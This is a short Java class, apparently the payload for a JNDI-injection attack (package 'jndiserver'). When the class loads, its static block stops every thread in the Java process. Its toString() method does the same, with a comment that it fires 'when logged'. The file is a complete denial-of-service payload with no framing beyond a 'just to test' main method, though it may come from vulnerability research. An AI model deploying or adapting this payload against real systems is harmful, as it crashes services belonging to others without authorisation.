package jndiserver;

public  class ThreadKill implements Serializable {

    static {
        new ThreadKill().kill();
    }

    // just to test
    public static void main(String[] args) {
        new ThreadKill().kill();
    }

    private void kill() {
        System.out.println("Hello from ThreadKill");
        for (Thread thread : Thread.getAllStackTraces().keySet()) {
                thread.stop();
        }
        System.out.println("OK");
    }

    // will be triggered when logged
    @Override
    public String toString() {
        kill();
        return "ThreadKill";
    }
}